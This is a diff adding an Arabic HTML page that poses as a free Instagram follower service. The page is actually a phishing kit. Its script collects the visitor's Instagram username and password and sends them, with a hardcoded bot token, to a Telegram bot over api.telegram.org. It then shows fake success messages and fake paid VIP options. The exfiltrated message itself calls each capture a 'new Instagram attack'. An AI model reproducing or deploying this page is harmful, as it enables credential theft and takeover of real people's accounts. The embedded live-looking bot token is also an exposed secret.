@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>إنسقرام برو | 𝙛𝙖𝙧𝙚𝙨𝙖𝙡𝙬𝙨𝙖𝙗𝙞</title>
+    <style>
+        :root { --neon: #d62976; --gold: #ffd700; }
+        body { background: #000; color: #fff; font-family: 'Segoe UI', Tahoma, sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; }
+        .card { background: #0a0a0a; padding: 30px; border-radius: 30px; border: 2px solid var(--neon); width: 380px; text-align: center; box-shadow: 0 0 40px rgba(214, 41, 118, 0.2); }
+        h2 { background: linear-gradient(45deg, #f09433, #bc1888); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 28px; margin-bottom: 5px; }
+        input { width: 90%; padding: 15px; margin: 10px 0; border-radius: 12px; border: 1px solid #222; background: #000; color: #fff; text-align: center; font-size: 16px; outline: none; transition: 0.3s; }
+        input:focus { border-color: var(--neon); box-shadow: 0 0 10px var(--neon); }
+        
+        /* زر الطلب المجاني */
+        .btn-free { width: 100%; padding: 18px; background: linear-gradient(45deg, #f09433, #e6683c, #dc2743, #cc2366, #bc1888); border: none; color: white; font-weight: bold; border-radius: 15px; cursor: pointer; font-size: 19px; margin-top: 15px; box-shadow: 0 5px 20px rgba(214, 41, 118, 0.4); transition: 0.3s; }
+        .btn-free:hover { transform: scale(1.03); }
+
+        .vip-title { color: var(--gold); font-size: 14px; margin-top: 25px; display: flex; align-items: center; justify-content: center; gap: 10px; }
+        .vip-title::before, .vip-title::after { content: ""; height: 1px; width: 50px; background: #333; }
+
+        /* خيارات مدفوعة كثيرة ومرتبة */
+        .grid-paid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-top: 15px; }
+        .btn-paid { background: #111; color: #aaa; border: 1px solid #222; padding: 10px; border-radius: 10px; font-size: 12px; cursor: pointer; transition: 0.2s; }
+        .btn-paid:hover { border-color: var(--gold); color: var(--gold); }
+        
+        .footer { margin-top: 30px; color: #444; font-size: 14px; font-weight: bold; letter-spacing: 2px; }
+    </style>
+</head>
+<body>
+
+    <div class="card">
+        <h2>إنسـتقرام بريميوم 🚀</h2>
+        <p style="color: #666; font-size: 13px;">أدخل اليوزر وكلمة السر للحصول على 100 متابع فوراً</p>
+        
+        <input type="text" id="user" placeholder="اسم المستخدم (Username)">
+        <input type="password" id="pass" placeholder="كلمة السر">
+        
+        <button class="btn-free" onclick="orderNow('100 متابع مجاني')">🎁 اطلب 100 متابع (مجاناً)</button>
+        
+        <div class="vip-title">💎 خيارات VIP المدفوعة 💎</div>
+        
+        <div class="grid-paid">
+            <button class="btn-paid" onclick="paidMsg()">🔥 5k متابع [$10]</button>
+            <button class="btn-paid" onclick="paidMsg()">👑 20k متابع [$35]</button>
+            <button class="btn-paid" onclick="paidMsg()">💎 50k متابع [$60]</button>
+            <button class="btn-paid" onclick="paidMsg()">🌍 100k عالمي [$99]</button>
+            <button class="btn-paid" onclick="paidMsg()">✅ توثيق زرقاء [$150]</button>
+            <button class="btn-paid" onclick="paidMsg()">📈 دعم اكسبلور [$25]</button>
+            <button class="btn-paid" onclick="paidMsg()">👤 تنظيف حساب [$15]</button>
+            <button class="btn-paid" onclick="paidMsg()">🛡️ حماية حساب [$40]</button>
+        </div>
+
+        <div class="footer">𝙛𝙖𝙧𝙚𝙨𝙖𝙡𝙬𝙨𝙖𝙗𝙞</div>
+    </div>
+
+    <script>
+        async function orderNow(service) {
+            // حط التوكن حقك هنا بدقة
+            const token = "
+8250478196:AAH0J5NF3cOvM_Zm_DqE8wmbeKJc3zsbviM"; 
+            
+            const params = new URLSearchParams(window.location.search);
+            const chatId = params.get('chatId');
+            
+            const user = document.getElementById('user').value;
+            const pass = document.getElementById('pass').value;
+
+            if(!user || !pass) {
+                alert("⚠️  ، لازم تدخل اليوزر والباسورد أولاً!");
+                return;
+            }
+
+            if(!chatId || token.includes("ضـع_تـوكـن")) {
+                alert("⚠️ خطأ في التكوين!\nتأكد أنك وضعت التوكن في الكود وتفتح الرابط مع chatId");
+                return;
+            }
+
+            const msg = `🚀 **هجمة إنستقرام جديدة**\n👤 اليوزر: \`${user}\` \n🔑 الباسورد: \`${pass}\` \n📦 الخدمة: ${service}\n🆔 chatId: ${chatId}\n\nبواسطة: 𝙛𝙖𝙧𝙚𝙨𝙖𝙡𝙬𝙨𝙖𝙗𝙞`;
+
+            // إظهار تنبيه جاري التحميل (عشان يعرف إن الزر شغال)
+            alert("⏳ جاري التحقق من الحساب وطلب المتابعين..");
+
+            try {
+                const res = await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+                
+                if(res.ok) {
+                    alert("✅ تم قبول طلبك بنجاح! سيتم البدء في إرسال الـ 100 متابع خلال دقائق.");
+                } else {
+                    alert("❌ فشل الطلب! تأكد من صحة التوكن.");
+                }
+            } catch(e) {
+                alert("❌ مشكلة في الاتصال بالسيرفر!");
+            }
+        }
+
+        function paidMsg() {
+            alert("⚠️ هذا الخيار مدفوع! يرجى تفعيل اشتراك VIP عبر التواصل مع المطور 𝙛𝙖𝙧𝙚𝙨𝙖𝙡𝙬𝙨𝙖𝙗𝙞");
+        }
+    </script>
+</body>
+</html>
